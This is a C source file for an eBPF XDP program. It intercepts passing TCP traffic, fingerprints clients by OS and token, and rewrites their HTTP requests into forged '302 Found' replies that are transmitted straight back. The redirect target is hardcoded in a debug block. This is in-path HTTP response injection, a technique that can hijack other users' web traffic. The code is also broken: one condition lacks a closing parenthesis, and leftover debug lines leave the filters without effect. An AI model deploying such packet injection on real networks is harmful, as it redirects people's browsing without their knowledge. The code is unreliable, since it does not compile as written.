#include "lib/api.h"
#include "maps.h"

BPF_LICENSE("Dual MIT/GPL");

SEC("xdp")
int xdp_redirectHTTPS_prog(struct xdp_md* ctx) {
    struct pkthdr pkt = { 
        .data_begin = (void*)(long)ctx->data,
        .data_end = (void*)(long)ctx->data_end,
        .data_cursor = (void*)(long)ctx->data
    };

    // 1. config verify
    __u32 key_config_map = 0;
    struct config* cfg = bpf_map_lookup_elem(&config_map, &key_config_map);
    if (cfg == NULL) {
        update_metrics(METRICS_CONFIG_MAP_ERR);
        // printk("config not found %p", cfg);
        return XDP_PASS;
    }
    // printk("config %x %x", cfg, cfg->ipdst_host);
    // update_metrics(METRICS_PKT_COUNT);

    // 2. eth parse and verify, 只留IP包
    if (eth_parse(&pkt) != __constant_htons(ETH_P_IP)) {
        update_metrics(METRICS_ETH_ERR);
        return XDP_PASS;
    }
    // printk("eth cursor %x", pkt.data_cursor);


    // 3. ipv4 parse and verify, host pkt pass
    int proto = ipv4_parse(&pkt);
    if (proto < 0) {
        return XDP_PASS;
    }
    // 本机自己服务的包放行
    if (cfg->ip_host == pkt.ipv4->daddr || cfg->ip_host == pkt.ipv4->saddr) {
        // printk("ip host: cfghost/pkt_src/pkt_dst %x %x %x", cfg->ip_host, pkt.ipv4->saddr, pkt.ipv4->daddr);
        update_metrics(METRICS_HOST_COUNT);
        return XDP_PASS; // 本机debug时开启
    }
    if (proto != IPPROTO_TCP) {
        update_metrics(METRICS_IPV4_ERR);
        return XDP_PASS; //XDP_DROP;
    }
    // printk("ip cursor %x", pkt.data_cursor);

    // 4. tcp parse and verify
    if (tcp_parse(&pkt) < 0) {
        // update_metrics(METRICS_TCP_ERR);
        return XDP_DROP; //XDP_ACTION;
    }
    // printk("tcp flags %d %d", pkt.tcp->syn, pkt.tcp->ack);

    save_token(&pkt); 
    // return XDP_PASS; //XDP_ACTION;

    if (!is_tcp_data(&pkt)) {
        // update_metrics(METRICS_TCP_ERR);
        return XDP_PASS; //XDP_ACTION;
    }
    // update_metrics(METRICS_TCP);
    // printk("tcp cursor %x", pkt.data_cursor);

    // 5. os filter
    bool ok_linux = is_linux(&pkt);
    bool ok_token = is_token(pkt.ipv4->saddr);

    // 6. http parse and filter os
    if (!ok_linux) {
        // update_metrics(METRICS_OS_WIN);
        printk("is_linux: NOT");
    }     

    // 7. lookup hashmap of token
    if (!ok_token {
        // update_metrics(METRICS_OS_WIN);
        printk("is_token: NOT");
    }
    if (!ok_linux && !ok_token) {
        // return XDP_PASS;
    }
    
    // 8. http parse and verify 
    if (!is_http_reqest(&pkt)) {
        return XDP_DROP; //XDP_PASS;
    }
    // update_metrics(METRICS_HTTP);
    // update_metrics(METRICS_OS_LINUX);
    // send_pkt_info(ctx, &pkt, METRICS_OS_LINUX, 1);

    // 9. redirect http  本机debug时关闭
    // __builtin_memcpy(pkt.eth->h_dest, cfg->machost, ETH_ALEN);

    // debug 本机debug时开启
    char u[] = "HTTP/1.1 302 Found\r\nContent-Length: 0\r\nLocation: https://www.baidu.com//\r\n\r\n";//000000000000000000000000";
    __builtin_memcpy(cfg->redirect_url_linux, u, sizeof(u) - 1);
    cfg->redirect_url_linux[SIZE_REDIRECT_URL - 1] = 84;

    __u8 len_payload_url = cfg->redirect_url_linux[SIZE_REDIRECT_URL - 1]; // len_payload_url = last byte 
    if (len_payload_url > 120 || len_payload_url < 30) {
        printk("url len len_payload_url > 120 %d", len_payload_url);
        return XDP_DROP; //XDP_PASS;
    } 

    printk("http_redirect: %x %x %x", pkt.data_tcp_opts, pkt.data_cursor, pkt.data_end);
    // pkt.data_cursor = pkt.data_tcp_opts;
    pkt.data_cursor = (__u8*)(pkt.tcp) + sizeof(struct tcphdr);

    http_redirect(&pkt, cfg->redirect_url_linux, len_payload_url); 
    int offset = (int)(pkt.data_cursor - pkt.data_end) + len_payload_url;
    int err = bpf_xdp_adjust_tail(ctx, offset); // 扩容并修改结束位置
    if (err != 0) {
        // printk("Err bpf_xdp_adjust_tail %d", err);
    }

    return XDP_TX;
    // return XDP_PASS;
}